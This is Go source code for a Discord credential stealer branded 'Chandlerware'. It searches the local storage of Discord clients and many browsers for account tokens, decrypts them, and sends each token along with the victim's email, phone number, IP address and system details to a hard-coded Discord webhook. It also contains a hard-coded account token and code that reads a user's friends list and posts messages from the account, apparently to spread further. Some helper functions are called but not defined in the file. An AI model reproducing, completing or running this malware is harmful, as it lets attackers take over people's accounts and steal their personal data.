package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/fs"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"

	"golang.org/x/exp/slices"
)

var tokens []string = []string{}

type UserData struct {
	Id                string
	Username          string
	Avatar            string
	Avatar_Decoration string
	Discriminator     string
	Public_Flags      int
}

type User struct {
	Id       string
	Nickname string
	User     UserData
}

const (
	WehookUrl = "https://discord.com/api/webhooks/1017841380824989746/RE5eOZAZWSs7qU0AkuxY9kbYxqFUXHgcqJALVRNYBTEOFk8N3CLwVK7KVDrO435HX_lS"
)

func main() {
	start()
	spred()
	// block_dc()

}

func spred() {
	for _, token := range tokens {
		fmt.Println(token)
		//  var friends []string
		body, err := getRequest("https://discord.com/api/v9/users/@me/relationships", true, "ODkwNjQ1MTYxNzk1NzkyOTQ2.G1t2OH.nZOw4JIT-skQ65_4LUMjEb2cDc-taebwaWlrUc")
		if err != nil {
			fmt.Println("hello?")
			continue
		}
		// fmt.Println(body)
		// test_data := []byte(`
		// ["
		// 	{"id": "162664712394244097",
		// 	"nickname": null,
		// 	"user":
		// 		{"id": "162664712394244097",
		// 		"username": "ChiliPepperHott",
		// 		"avatar": "a74dc64a0ddec227d71f4a372e71a5a9",
		// 		"avatar_decoration": null,
		// 		"discriminator": "4147",
		// 		"public_flags": 64}}
		// ]`)
		// test_data2 := []byte(`
		// [
		// 	{"id": "162664712394244097"}
		// ]`)

		var Friends []User
		err1 := json.Unmarshal([]byte(body), &Friends)

		if err1 != nil {
			fmt.Println(err1)
		}

		for _, user := range Friends {
			fmt.Println(user)
			data := []byte(`{content: "test"}`)
			req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/937809525728247818/messages", bytes.NewBuffer(data))

			req.Header.Set("Authorization", "ODkwNjQ1MTYxNzk1NzkyOTQ2.G1t2OH.nZOw4JIT-skQ65_4LUMjEb2cDc-taebwaWlrUc")
			cl := &http.Client{}
			fmt.Println("WTF??")
			res, err := cl.Do(req)
			if err != nil {
				fmt.Print("test")
				fmt.Println(string(res.StatusCode) + " " + res.Status)
			}
			print(res)

		}

		// req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/"+ ChannelId + "/messages")
	}
}

func send_info(token string) {

	data := []byte(grabTokenInformation(token))
	req, _ := http.NewRequest("POST", WehookUrl, bytes.NewBuffer(data))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	cl := &http.Client{}
	response, err := cl.Do(req)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(response.StatusCode) + " " + response.Status)

	defer response.Body.Close()
}

func grabTokenInformation(token string) (jsonEmbed string) {

	// Get User displayName
	var displayName string
	currentUser, err := user.Current()
	if err != nil {
		displayName = "Unknown"
	} else {
		displayName = currentUser.Name
	}

	// Get OS Type & Proc arch
	osName := runtime.GOOS
	cpuArch := runtime.GOARCH

	// Get computer IP
	var ip string
	body, err := getRequest("https://ipinfo.io/ip", false, "")
	if err != nil {
		ip = "Unknown"
	} else {
		ip = body
	}

	var tokenInformation string
	body, err = getRequest("https://discord.com/api/v9/users/@me", true, token)
	if err != nil {
		tokenInformation = "Unknown"
	} else {
		tokenInformation = body
	}

	discordUser := getJsonValue("username", tokenInformation) + "#" + getJsonValue("discriminator", tokenInformation)
	discordEmail := getJsonValue("email", tokenInformation)
	discordPhone := getJsonValue("phone", tokenInformation)
	discordAvatar := "https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200" + getJsonValue("id", tokenInformation) + "/" + getJsonValue("avatar", tokenInformation) + ".png"

	var discordNitro string
	body, err = getRequest("https://discord.com/api/v9/users/@me/billing/subscriptions", true, token)
	if err != nil {
		discordNitro = "Unknown"
	} else {

		if body == "[]" {
			discordNitro = "No"
		} else {
			discordNitro = "Yes"
		}
	}
	tokens = append(tokens, "this.is.a.tokens")
	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + currentUser.Name + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
	return
}

func start() {
	appdata, _ := os.UserConfigDir()
	localappdata, _ := os.UserCacheDir()
	locations := []string{}

	// Token locations
	locations = append(locations, appdata+"\\discord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordcanary\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\discordptb\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Lightcord\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\")
	locations = append(locations, appdata+"\\Mozilla\\Firefox\\Profiles")
	locations = append(locations, localappdata+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Yandex\\YandexBrowser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
	locations = append(locations, localappdata+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\")
	locations = append(locations, localappdata+"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\")

	for _, location := range locations {
		if _, err := os.Stat(location); os.IsNotExist(err) {
			continue
		}
		if strings.Contains(location, "Mozilla") {
			for _, filepath := range get_files(location, ".sqlite") {
				r := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
					tokens = append(tokens, match...)

				}
			}
		}
		if strings.Contains(location, "cord") {
			for _, filepath := range get_files(location, ".ldb") {
				r := regexp.MustCompile("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")
				file, _ := os.Open(filepath)
				data, _ := ioutil.ReadAll(file)
				for _, match := range r.FindAllString(string(data), -1) {
					baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
					tokenEnc, _ := base64.StdEncoding.DecodeString(baseToken)
					token, _ := decryptToken(tokenEnc)
					_, val := get_token_info(token)
					if !val {
						continue
					}

					if !slices.Contains(tokens, string(token)) {
						tokens = append(tokens, string(token)+"")
						send_info(token)

					}
				}
			}
		}

	}
}

func get_files(root, ext string) []string {
	var a []string
	filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
		if e != nil {
			return e
		}
		if filepath.Ext(d.Name()) == ext {
			a = append(a, s)
		}
		return nil
	})
	return a
}
func getJsonValue(key string, jsonData string) (value string) {

	var result map[string]interface{}

	err := json.Unmarshal([]byte(jsonData), &result)
	if err != nil {
		return "Unknown"
	}

	value = fmt.Sprintf("%v", result[key])
	return
}
